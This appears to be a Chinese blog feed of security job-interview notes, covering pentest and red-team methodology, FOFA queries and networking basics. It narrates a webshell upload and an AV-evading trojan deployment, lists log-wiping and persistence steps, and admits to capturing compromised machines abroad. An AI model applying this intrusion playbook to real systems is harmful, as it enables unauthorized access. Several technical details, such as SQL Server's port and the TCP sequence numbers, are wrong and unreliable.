    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自身方面的提问是对综合素质的考察。</p><span id="more"></span><h1 id="挖洞经历"><a href="#挖洞经历" class="headerlink" title="挖洞经历"></a>挖洞经历</h1><ol><li><p>介绍一下自己挖得印象最深&#x2F;挖得最有成就感&#x2F;挖得最有趣&#x2F;挖得最难的一个洞？</p></li><li><p>平时使用的比较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复方案？</p></li><li><p>Java中挖过的通用洞，会怎么利用&#x2F;组合？</p></li><li><p>讲一个你觉得有趣的漏洞案例</p></li><li><p>前段时间蓝凌OA的洞</p></li><li><p>了解什么比较新的漏洞</p></li></ol><p>exit_hook攻击<br>适用版本：glibc-2.34 后失效<br>利用条件:<br>至少有一次任意写<br>程序可以结束(可显式触发 <code>exit</code> 函数 或 主函数由 <code>libc_start_main</code> 启动且可正常退出)，调用到 <code>_dl_fini</code> 函数<br><a href="https://xz.aliyun.com/t/12856">exit_hook攻击利用</a></p><ol start="7"><li>你在SRC挖掘中遇到最多的漏洞是什么？</li></ol><p>sql注入</p><ol start="8"><li>有拿过cnvd证书吗</li></ol><p>没。</p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ol><li>如果给你一个网站，你的渗透测试思路是什么？在获取书面授权的前提下。<br>渗透测试流程：<br>1、明确目标<br>确认范围：测试目标的范围、ip、域名、内外网、测试账户。<br>确认规则：能渗透到什么程度，所需时间，能否修改上传，能否提权。<br>确认需求：web应用漏洞，业务逻辑漏洞，人员权限管理漏洞。</li></ol><p>2、信息收集<br>方式：主动扫描，开放搜索等。<br>开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。<br>基础信息：IP、网段、域名、端口。<br>应用信息：各端口的应用。例如web应用、邮件应用、等等。<br>系统信息：操作系统版本<br>版本信息：所有这些探测到的东西的版本。<br>服务信息：中间件的各类信息，插件信息。<br>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。<br>防护信息：试着看能否探测到防护设备。</p><p>3、漏洞探测<br>利用上一步中列出的各种系统，应用等使用相应的漏洞。<br>方法：<br>(1) 漏扫，awvs，Nessus，IBM appscan。<br>(2) 结合漏洞去exploit-db等位置找利用。<br>(3) 在网上寻找验证poc。<br>内容：<br>系统漏洞：系统没有及时打补丁<br>WebSever漏洞：WebSever配置问题<br>Web应用漏洞：Web应用开发问题<br>其它端口服务漏洞：各种21&#x2F;8080(st2)&#x2F;7001&#x2F;22&#x2F;3389<br>通信安全：明文传输，token在cookie中传送等。</p><p>4、漏洞验证<br>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。<br>自动化验证：结合自动化扫描工具提供的结果<br>手工验证，根据公开资源进行验证<br>试验验证：自己搭建模拟环境进行验证<br>登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息<br>业务漏洞验证：如发现业务漏洞，要进行验证<br>公开资源的利用：<br>exploit-db&#x2F;wooyun&#x2F;<br>google hacking<br>渗透代码网站<br>通用、缺省口令<br>厂商的漏洞警告等等。</p><p>5、信息分析<br>为下一步实施渗透做准备。</p><p>精准打击：准备好上一步探测到的漏洞的exp，用来精准打击<br>绕过防御机制：是否有防火墙等设备，如何绕过<br>定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标<br>绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）<br>攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</p><p>6、获取所需<br>实施攻击：根据前几步的结果，进行攻击<br>获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）<br>进一步渗透：内网入侵，敏感目标<br>持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等<br>清理痕迹：清理相关日志（访问，操作），上传文件等</p><p>7、信息整理<br>整理渗透工具：整理渗透过程中用到的代码，poc，exp等<br>整理收集信息：整理渗透过程中收集到的一切信息<br>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</p><p>8、形成报告<br>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告<br>补充介绍：要对漏洞成因，验证过程和带来危害进行分析<br>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</p><ol start="2"><li>有什么比较曲折的渗透经历？</li></ol><p>在一个网站发现了登录框，发现存在未授权访问，可以允许用户未授权查看，编辑和删除。于是将界面修改了uid&#x3D;1之后，看到密码已填充，以*显示，然后修改前端password属性为text属性之后，密码明文显示。成功拿到管理员账户和密码，并成功登入后台。<br>进入后台后，发现有一个上传头像的功能点，然后我们尝试这里是否有文件上传漏洞。于是上传了一个图片马，通过修改文件头GIF89a，成功将木马上传。问题在于文件名修改为随机数无法确认。但发现了一个文件上传时间，直接比对时间确认上传的文件，最终蚁剑连接拿到webshell。<br>之后尝试将自己的免杀马通过CS上传到主机，首先使用命令查看了 <code>tasklist /svc</code> ，将进程复制到在线杀软识别平台中，发现目标主机上装了360。接下来就上传免杀马，却无法反弹shell。<br>为了搞清楚没反弹shell的原因，我在cmd图形化窗口下执行了木马，发现提示缺少了某140D.dll，研究了一下发现是生成exe文件时的配置问题，当我们生成release版本的时候，运行库选择MT；当生成debug版本的时候，运行库选择MTD。所以自己电脑上执行没问题，在其它电脑上执行会显示缺少dll文件。于是重新把木马生成，最后成功上线。</p><ol start="3"><li><p>了解哪些漏洞？</p></li><li><p>写poc&#x2F;exp的经历和心得</p></li><li><p>复现的一些漏洞</p></li><li><p>简述一个网站的渗透测试思路</p></li><li><p>渗透大企业简单还是小企业简单，为什么<br>大企业。<br>小企业公司的业务少，只有那么几个暴露在外网的服务，服务越少越容易管理，越不容易出现漏洞。所以大企业攻击面越大我们的成功率就越大</p></li><li><p>渗透的时候如何隐藏自己的身份？</p></li><li><p>给你一个后台登录地点的网站，你能从中发现哪些问题？</p></li><li><p>给你一千台服务器和交换机，你会如何进行扫描</p></li><li><p>复现过哪些漏洞，在哪里跟进漏洞？</p></li><li><p>你认为你的渗透水平在国内大概是什么水平，能给自己打多少分？</p></li><li><p>最得意的一次渗透测试</p></li><li><p>漏洞平台的贡献是多少，排名是多少？</p></li><li><p>代码审计的时候你比较关注的漏洞是哪些？</p></li></ol><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ol><li><p>有没有web服务开发经验？</p></li><li><p>编程能力</p></li><li><p>Java学到哪种程度了？</p></li></ol><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li>多久开始接触安全的？</li></ol><p>2020年</p><ol start="2"><li>熟悉安全的哪些内容？web？逆向？iot？在公司主要的工作内容？</li></ol><p>web安全，渗透测试，安全防护</p><ol start="3"><li>安全工具的使用</li></ol><p>kali下的sqlmap，nmap，beef，metasploit等，CobaltStrike, Nessus, AWVS, 御剑，DirBuster, appscan, xray, goby, 菜刀，御剑，冰蝎，BurpSuite, Wireshark.</p><ol start="4"><li><p>自我介绍<br>你好，我是宋岳洋，一名来自成都信息工程大学信息安全专业的大四学生，很高兴参加今天的面试。我将通过几个特性来展开介绍自己：<br>第一，勇于尝试。我在护网中做过蓝队的安全监控，红队的外围打点。这个特性能让我在公司安排了任务的时候能够勇敢参与积极尝试。<br>第二，敏锐机智。我能抓住一些别人没有意识到的机会。我在看油管节目发现很多人想付油管频道会员却没有支付手段，于是我做了中间商代客户购买会员，第一个月赚了3万元。我认为这个特性能够帮助我在工作中找到独特的解决方案，从而降低项目所需的时间与成本。<br>第三，耐心坚持。这个特性我是在大学的炒币中学会的，也在我之后的经历中不断起作用：我第一次搭建博客的时候没有任何经验掉进了一个又一个坑。很多时候要从头开始但我每次都坚持过来了。我认为这个特性能够让我即使不断失败最终也能完成艰巨的任务。<br>第四，热情洋溢。我认为一件事在有激情的情况下能做得更好。我能够坐在电脑前连续8小时研究一个东西不起身，有时也会忘记吃饭和睡觉。我认为这个特性能够给整个团队带来积极氛围，帮助在工作中迅速高质量地完成任务。</p></li><li><p>hw经历</p></li></ol><p>2021年国护蓝队初级。<br>2022年国护红队初级。<br>2023年国护红队初级。</p><ol start="6"><li>对红蓝对抗的看法</li></ol><p>攻防趋势演变越来越激烈。红队普遍要比蓝队强大。<br><a href="https://cn-sec.com/archives/366788.html">红队浅析一</a></p><ol start="7"><li>你觉得什么是你自己比较擅长的而我没有问到的？</li></ol><p>擅长绕waf</p><ol start="8"><li>针对web扫描器的爬虫，你怎么看？</li></ol><p>还可以</p><ol start="9"><li>企业内部安全</li></ol><p>内部安全通常比较薄弱，最大的问题尤其是管理人员的疏忽。</p><ol start="10"><li>怎么判断目前是否是cms？</li></ol><p>(1) 查看网页源代码，查找CMS系统的标识符。如：WordPress的标识符是wp-content, wp-includes；DedeCMS的标识符是dedeajax, uploadsalling；Discuz：uchome、uc_server<br>(2) 访问robots.txt文件，可以查看CMS系统禁止访问的文件或目录。如：WordPress禁止访问的文件或目录包括wp-admin、wp-includes、wp-content等<br>(3) 使用CMS识别工具。在线CMS识别工具：Wappalyzer, WhatCMS；命令行CMS识别工具：cmsdetect；脚本CMS识别工具：cmsdetect.py。<br>(4) 尝试登录后台。在网站网址后面加上 <code>**/admin  或  /login**</code> 等后缀，如果可以访问到CMS系统的后台，则可判断该网站使用了CMS。<br>(5) URL 结构：使用了 CMS 的网站，其 URL 结构通常包含标识符，例如 “&#x2F;category” 或 “&#x2F;tag” 等。</p><ol start="11"><li>做过黑产吗？</li></ol><p>没</p><ol start="12"><li>以后的发展？</li></ol><p>首先是大致精通web安全，然后再将web安全与AI结合起来。因为以后必然是AI的时代。</p><ol start="13"><li>多久能学会？</li></ol><p>不敢说什么东西多久能学会，但会尽力去学，用空闲时间研究学习。</p><ol start="14"><li>说说你以前在你公司主要做什么安全工作？如每天，每月，每年做些什么安全工作？</li></ol><p>渗透测试。</p><ol start="15"><li>你写过什么好的安全漏洞文章发布过吗？是否可以说说？</li></ol><p>没有。</p><ol start="16"><li>说说你的其它优势（如：对安全新兴技术的研究、个人博客、比赛、在校经历等）</li></ol><p>我在校期间做过家教，炒股，炒币，代付等赚钱方式，这些经历能够使我拥有更开阔的视野。</p><ol start="17"><li>说说大学这几年最自豪的事情</li></ol><p>一个月赚了3万元。</p><ol start="18"><li>CTF你都做过哪些题型？</li></ol><p>web安全的各种题型基本都有涉及。SQL注入，文件上传，文件包含，CSRF，SSRF，爆破，RCE，反序列化，XXE，SSTI，XSS。PHP。</p><ol start="19"><li>遇到的比较困难的web题型的ctf题目</li></ol><p>ctfshow的命令执行 web40<br>ctfshow的PHP web133</p><ol start="20"><li>假如让你设计一个waf，你会怎么设计？</li></ol><p>不知道，兼容性好的。<br><a href="https://cloud.tencent.com/developer/article/1043131">互联网公司WAF系统设计</a></p><ol start="21"><li>有没有写过一些脚本？</li></ol><p>写过。主要是python脚本，抓取信息，下载。爬虫。<br><a href="https://www.freebuf.com/vuls/281949.html">渗透测试之特殊需求的图形验证码识别脚本快速开发</a><br><a href="https://blog.csdn.net/isluckyboy/article/details/116768239">用python写渗透测试脚本</a><br><a href="https://www.gingerdoc.com/python_penetration_testing/python_penetration_testing_quick_guide">Python 渗透测试</a><br><a href="https://cloud.tencent.com/developer/article/1441816">聊一聊渗透测试过程中的脚本功能</a></p><ol start="22"><li>为什么做这一行？</li></ol><p>喜欢。向往。有趣。</p><ol start="23"><li>是否有在国外抓过肉鸡，有没有做黑产的朋友</li></ol><p>有。<br><a href="https://cloud.tencent.com/developer/article/2245714">抓肉鸡的几种方法</a></p><ol start="24"><li>是否能接受驻场？</li></ol><p>驻场就是不在公司工作,而是去公司指定的别的地方工作,而且几乎是长期在外。<br><a href="https://www.freebuf.com/articles/security-management/243980.html">安全驻场工程师的自我救赎之路</a><br>无论是在本公司工作还是驻场，都不是最重要的。关键在于能否学到东西。我希望进公司后能够学习到更多东西，掌握理论知识，提高实践能力。不仅仅是做着简单的事务，而是为公司能够有更多的贡献。为公司的发展添砖加瓦。</p><ol start="25"><li>都破解过哪些软件？如果给你一个产品，你能提出安全加固建议吗？</li></ol><p>拷贝漫画。<br><a href="https://developer.aliyun.com/article/297988">破解apk</a><br><a href="https://github.com/jjz/blog/blob/master/android/Apk%E5%8C%85%E7%9A%84%E7%A0%B4%E8%A7%A3%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91.md">APK包的破解与反编译</a><br><strong>安全加固</strong>：<br>源码加固：<br>Java源码加固-dex文件加壳保护、dex函数抽取加密；<br>SO库加固-SO文件加壳保护、高级深度混淆、ELF数据隐藏；<br>Html加固；<br>资源文件加固-音视频加密、配置文件和数据库加密；</p><p>运行环境加固：<br>完整性保护-签名、防二次打包；<br>防调试保护-双向ptrace保护、反IDAPro调试；<br>防篡改保护-防数据破解分析、防数据劫持；<br>反编译保护-反apktool、反ApkIDE、反jd-gui；<br>模拟器识别；<br>ROOT检测；</p><p>业务场景加固：<br>密钥保护；<br>安全键盘；<br>防界面劫持；<br>反外挂；<br>清场；<br>通信协议加密；</p><p><a href="https://zhuanlan.zhihu.com/p/473745398">App安全加固</a></p><p><strong>护网</strong></p><p>针对面试可能问到的护网问题进行总结：</p><ol><li><pre><code>中国电信广东分公司 安全监控</code></pre>1.1 地址：广东省广东市海珠区南贤大街51号</li></ol><p>1.2 护网流程：<br>备战期：<br>记得当时是提前2天进场，公司做了简单培训，明确了责任分工。<br>之后我们对资产梳理扫描，做一个简单的内部测试渗透。每人分配一两个IP地址，去做渗透工作。<br>首先用nmap 扫描全端口，共享资产列表，互相补充。<br>关闭不再用的业务系统；关闭重要系统外网访问通道，通过VPN进行业务操作。<br>对梳理好的资产进行弱口令扫描，漏洞扫描，渗透测试，基线检查。有问题及时整改加固，然后复测。<br>之后再用Nessus扫描，生成报告，将这个报告与之前的报告对比，看看有没有共同点，报告里的漏洞分了初中高级。<br>接下来就是漏洞复现，能够复现成功的就写报告提交给甲方。</p><p>1.3内部攻防演练<br>发现备战期忽略遗漏的地方，并进行整改。<br>侧重于web漏洞而较少关注中间件漏洞，导致被攻击方攻破。<br>VPN的用户名和密码仅仅经过了简单编码base64存储在app中，被攻击方发现直接进入内网。<br>改正：针对中间件更新补丁，删除被利用的war包。用户名密码泄露问题不写死在app中，并通过验证码登录，将app混淆，防止反编译。</p><p>1.4安全设备<br>安全狗，WAF，入侵检测系统IDS，入侵防御系统IPS。漏洞扫描器，DDOS防护，监控设备：SOC安全运营中心（奇安信NGSOC）。<br>1.5开战期<br>排班制，来了后先和前面的人交接一下，然后开始看监控，10个人一起，项目经理给分，我当时看的是奇安信的，发现异常的时候有个工单，工单系统把来源IP与目标ip写上，然后把日志贴上去就行。<br>IP能封几万条。<br>1.6工作职责<br>主要就是看设备报警，发现危险IP，判断是否为一个安全事件，如果是就决定封锁。看安全厂商的安全设备，比如态势感知，用的是奇安信的NGSOC，还有他们那个全流量分析天眼，IDS，IPS，内网蜜罐系统。如果说态势感知放在外网，就针对外网下的流量进行监控，流量扫描这些。<br>1.7其它<br>11<br>11<br>2.安恒信息公司 外围打点 2022，2023<br>2.1 打点的基本认识<br>所谓打点，就是拿一台机器的shell。打点的目的一般在于利用这台机器作为跳板进入内网。<br>2.2 打点的基本方法<br>流程：靶标确认—信息收集—漏洞探测—漏洞利用—权限获取<br>2.3靶标确认<br>确认攻击范围，防止攻击打偏的情况，例如IP段，子域名等域名信息。<br>2.4信息收集<br>包括域名备案信息，真实IP，端口开放情况，网站目录结构，防护设备信息等。<br>2.5漏洞探测<br>根据信息收集的情况找到合适的漏洞poc进行测试，也可使用漏洞扫描器全方位漏洞探测。<br>2.6漏洞利用<br>Poc测试完成后，确认漏洞，使用exp攻击获取部分权限，如数据库权限，webshell权限等<br>2.7权限维持与提升<br>获取到基础权限之后，可通过认证绕过、溢出漏洞等本地提权方式获取靶标的最高权限(如管理员权限，系统权限等)<br>2.8横向移动<br>获取靶标最高权限，可尝试获取靶标所在内网中的其它机器的权限<br>2.9信息收集步骤<br>(1)得到攻击目标(假设公司)，通过企查查搜索，得到公司和子公司信息。<br>(2)通过公司和子公司信息，用oneforall得到子域名。<br>(3)将子域名拿到Eeyes(棱眼)跑一遍，得到子域名所对应的IP和C段信息。（C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。）<br>(4)将对应IP和C段丢给fofa和fscan，fofa能快速得到C段资产信息；fscan能快速扫一遍，顺便打一下常见漏洞。（Fofa 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配。 例如进行漏洞影响范围分析、应用分布统计、应用流行度等。 在渗透测试过程中，Fofa能帮助测试人员快速发现目标资产。）（Fscan是一款内网综合扫描工具，它非常的方便，一键启动，之后完全自动化、并且全方位漏洞扫描。 它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。）<br>(5)如果fscan爆出漏洞可拿去利用（小概率）<br>(6)查看通过fofa得到的资产，可配合ehole的指纹识别来快速筛选。通过筛选敏感资产（如shiro, fastjson等）直接能够反序列化getshell的资产（小概率）。（EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic…)。 EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。）<br>(7)获得了登陆后台&#x2F;用户登录&#x2F;注册&#x2F;管理员等交互类型的资产后，可以尝试进行反序列化漏洞&#x2F;文件上传漏洞&#x2F;SQL注入等漏洞。<br>(8)对各种登录系统尝试弱口令&#x2F;SQL注入攻击，弱口令能登入后台就找上传点，SQL注入建议xray+burp检测，有戏再用sqlmap。fofa搜关键字，title&#x3D;”单位名”等，可自行穿插灵活使用，有时有效。弱口令登云桌面(horizen,vdi等)拿到shell的方式可尝试（小概率）。<br>(9)弱口令如果爆不出账号密码，考虑上 网盘&#x2F;GitHub&#x2F;社工库&#x2F;泄露公开库 搜对应人员信息，看是否有效。<br>(10)若无用，则查看 公众号&#x2F;app&#x2F;小程序 的信息。<br>(11)若无用，开始使用 域传送&#x2F;备案号&#x2F;IP反查网站&#x2F;ssl证书&#x2F;Google 来搜C段。<br>(12)若无用，使用 dirmap&#x2F;dirsearch 对可疑网站进行目录爆破。<br>(13)若无用，发钓鱼邮件。（网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达5%的人都会对这些骗局做出响应 。）<br>(14)若无用，申请近源渗透。（近源渗透通俗而言就是通过乔装、社工等方式实地物理侵入企业办公区域，通过其内部各种潜在攻击面（如Wi-Fi网络、RFID门禁、暴露的有线网口、USB接口等）获得“战果”，最后以隐秘的方式将评估结果带出上报，由此证明企业安全防护存在漏洞。）</p><p><a href="https://xz.aliyun.com/t/11300">记首次HW|某地级市攻防演练红队渗透总结</a></p><p>2.10Fofa在外网打点中的小技巧<br>后台挖掘： <code>title=”后台” &amp;&amp; body=”password” &amp;&amp; host=”x.cn”</code><br>子域名： <code>title != ‘404’ &amp;&amp; title!=’302’ &amp;&amp; host=’x.cn’</code><br>C段： <code>ip=’x.x.x.x/24’ &amp;&amp; host=’x.cn’</code><br>框架特征： <code>body=’icon-spring-boot-admin.svg’</code>  或  F12找到js链接，fofa搜索: <code>&quot;/Public/home/css/animate.min.css&quot;</code><br>漏洞： <code>body=’index/of’ [列目录漏洞]</code><br>真实IP探测： title搜IP与目标网站有关的；然后选择一个结果，查找该网站证书，将证书序列号(Serial Number)转为10进制，用fofa搜证书：  <code>cert=&quot;xxxx&quot;</code><br><a href="https://www.cnblogs.com/sunny11/p/14388508.html">Fofa搜索技巧</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;自身方面的提问是对综合素质的考察。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="自身方面" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%87%AA%E8%BA%AB%E6%96%B9%E9%9D%A2/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之计算机基础篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-05T08:00:04.592Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>地基。</p><span id="more"></span><h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><ol><li>什么是同源策略？</li></ol><p>源就是主机、协议、端口名的一个三元组。<br>同源策略(Same Origin Policy,SOP)是web应用程序的一种安全模型，被广泛地应用在处理web内容地各种客户端上，比如各大浏览器，Microsoft的Silverlight，Adobe的Flash&#x2F;Acrobat等等。同源策略限制不同源对当前document属性内容进行读取或设置。</p><ol start="2"><li>如何使得前端 referer 为空</li></ol><p>通过地址栏输入，书签里面选择或浏览器的插件BurpSuite修改。</p><ol start="3"><li>cookie参数，secure是干什么的？</li></ol><p>expire: 可选的有效期参数，设置cookie变量保存时间。第一种是写入 session ，在浏览器会话期间有效，关闭浏览器则失效。另一种是需要把 date 对象转换成字符串再写入 cookie。<br>HttpOnly: 只有在http请求下才可使用，防止cookie被xss偷<br>https: 防止cookie在网络中被偷<br>Secure: 只有在https的请求下才可使用，阻止cookie在非https下传输<br>Path: 指定的某个路径这个 cookie 才能使用，这里的一般直接就是设置成 <code>\</code> ，当前目录下都可使用，因为只要是当前域下的，其实都可以使用。区分cookie的标识，安全上作用不大，和浏览器同源冲突</p><ol start="4"><li>cookie的P3P性质</li></ol><p>http响应头的P3P(Platform for Privacy Preferences Project)字段是W3C公布的一项隐私保护推荐标准，该字段用于标识是否允许<strong>目标网站的cookie</strong>被<strong>另一个域</strong>通过加载目标网站而设置或发送，仅IE执行了该策略。<br>将情形分为两类，分别是设置与发送：<br>（1）设置cookie。在IE下默认是不允许第三方域设置的，除非foo域在响应的时候带上P3P字段，这样设置后，被加载的目标域的cookie就可以被正常设置了。<br>（2）发送cookie。如果是内存cookie，无所谓是否有P3P属性，就可以正常发送；如果是本地cookie，则这个cookie必须拥有P3P属性。</p><ol start="5"><li>常见的网站服务器容器</li></ol><p>(1) Apache: 目前Apache仍然是世界上用得最多的Web服务器，市场占有率约为60%左右。源代码开放、有一支强大的开发团队、支持跨平台的应用（可以运行在几乎所有的Unix、Windows、Linux系统平台上）以及它的可移植性等方面。<br>(2) IIS: Microsoft的Web服务器产品为Internet Information Services。IIS 是允许在公共Intranet或Internet上发布信息的Web服务器。<br>(3) Nginx: 读作”engine x”，是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP代理服务器。<br>(4) Tomcat: Tomcat是一个开放源代码、运行Servlet和JSP的容器。TomcatServer实现了Servlet和JSP规范。<br>(5) WebLogic: BEA WebLogic Server是一种多功能、基于标准的Web应用服务器，为企业构建自己的应用提供了坚实的基础。<br>(6) WebSphere: WebSphere Application Server是功能完善、开放的Web应用程序服务器，是IBM电子商务计划的核心部分，它是基于Java的应用环境，用于建立、部署和管理Internet和Intranet Web应用程序，适应各种Web应用程序服务器的需要，范围从简单到高级直到企业级。<br>(7) Kangle: Kangle Web服务器是一款跨平台、功能强大、安全稳定、易操作的高性能Web服务器和反向代理服务器软件。此外，Kangle也是一款专为做虚拟主机研发的Web服务器。</p><ol start="6"><li>3306，1443，8080是什么端口？</li></ol><p>3306: MySQL<br>1443: SQL Server<br>8080: 代理端口</p><ol start="7"><li>计算机网络从物理层到应用层xxxx</li></ol><p>物理层，链路层，网络层，传输层，应用层</p><ol start="8"><li>token和referer做横向对比，谁安全等级高？</li></ol><p>token安全等级高。<br>Referer可以伪造，而且不是任何服务器都可以取得referer，如果从https跳到http，也不会发送referer。并且一些flash版本可以自定义referer。对于token要保证其足够随机且不可泄露。客户端建议存储到sessionstage里。</p><ol start="9"><li>对referer的验证，从什么角度去做？如果做，怎么杜绝问题</li></ol><p>对header中的referer的验证，一个是空referer，一个是referer过滤或检测不完善。<br>为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p><ol start="10"><li>针对token，对token哪方面进行测试</li></ol><p>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击。<br>信息泄露方面，可以是缓存、日志、get或利用跨站。<br>很多跳转的登录都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了。<br>另外也可以结合其它业务来描述token的安全性及设计怎么不好怎么被绕过比如抢红包业务之类的。</p><ol start="11"><li>SSL&#x2F;TLS握手过程</li></ol><p>SSL(安全套接字层)是为HTTP开发的原始安全协议。不久前，SSL被TLS(传输层安全性)所取代。SSL握手现在称为TLS握手。<br>TLS握手步骤大致如下：<br>(1) 客户端问候(client hello) 消息：客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的TLS版本，支持的密码套件，以及一串被称为“客户端随机数(client random)”的随机字节。<br>(2) 服务端问候(server hello) 消息：作为对client hello消息的回复，服务器发送一条消息，内含服务器的SSL证书、服务器选择的密码套件，以及“服务器随机数(server random)”，即由服务器生成的另一串随机字符。<br>(3) 身份验证：客户端使用颁发该证书的证书颁发机构验证服务器的SSL证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。<br>(4) 预主密钥：客户端再发送一串随机字节，即“预主密钥(premaster secret)”。预主密钥是使用公钥加密的，只能使用服务器的私钥解密。（客户端从服务器的SSL证书中获得公钥）。<br>(5) 私钥被使用：服务器对预主密钥进行解密。<br>(6) 生成会话密钥：客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同结果。<br>(7) 客户端就绪：客户端发送一条“已完成”消息，该消息用会话密钥加密。<br>(8) 服务端就绪：服务端发送一条“已完成”消息，该消息用会话密钥加密。<br>(9) 实现安全对称加密：已完成握手，并使用会话密钥继续进行通信。</p><ol start="12"><li>TCP三次握手过程以及对应的状态转换</li></ol><p>(1) 客户端向服务端发送一个SYN包，包含客户端使用的端口号呃初始序列号x；<br>(2) 服务端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y；<br>(3) 客户端收到服务端返回的SYN，ACK报文后，向服务器发送一个确认号为yy1、序列号为xx1的ACK报文，一个标准的TCP连接完成。</p><ol start="13"><li>TCP和UDP协议区别</li></ol><p>tcp面向连接，udp面向报文；tcp对系统资源的要求多，udp结构简单；tcp保证数据完整性和顺序，udp不保证</p><ol start="14"><li>https的建立过程</li></ol><p>(1) 客户端发送请求到服务器端<br>(2) 服务器端返回证书和公开密钥，公开密钥作为证书的一部分存在<br>(3) 客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端<br>(4) 服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端<br>(5) 客户端使用共享密钥解密数据<br>(6) SSL加密建立</p><ol start="15"><li>http状态码：503，502，501</li></ol><p>503: 由于超载或系统维护，服务器暂时无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中。<br>502: 作为网关或代理工作的服务器尝试执行请求时，从远程服务器收到了一个无效的响应。<br>501: 服务器不支持请求的功能，无法完成请求。</p><ol start="16"><li>http请求方式及各自作用</li></ol><p>(1) GET–请求指定的页面信息，并返回实体主体。<br>(2) HEAD–类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。<br>(3) POST–向指定资源提交数据进行处理请求（例如提交表单或上传文件）。数据被包含在请求体中。POST请求可能导致新的资源建立和&#x2F;或已有资源的修改。<br>(4) PUT–从客户端向服务器传送的数据取代指定的文档和内容。<br>(5) DELETE–请求服务器删除指定的内容。<br>(6) CONNECT–HTTP&#x2F;1.1协议中预留给能够连接改为管道方式的代理服务器。<br>(7) OPTIONS–允许客户端查看服务器性能。<br>(8) TRACE–回显服务器收到的请求。<br>(9) PATCH–是对PUT方法的补充，用来对已知资源进行局部更新。</p><ol start="17"><li>计算机网络的分层及分别有哪些协议？</li></ol><p>物理层：RJ45, 802.3<br>数据链路层：SDLC，HDLC，PPP，STP<br>网络层：IP，IPX，ICMP，IGMP，ARP，RARP，OSPF<br>传输层：TCP，UDP<br>应用层：文件传输(FTP)，电子邮件(SMTP)，万维网(HTTP)</p><ol 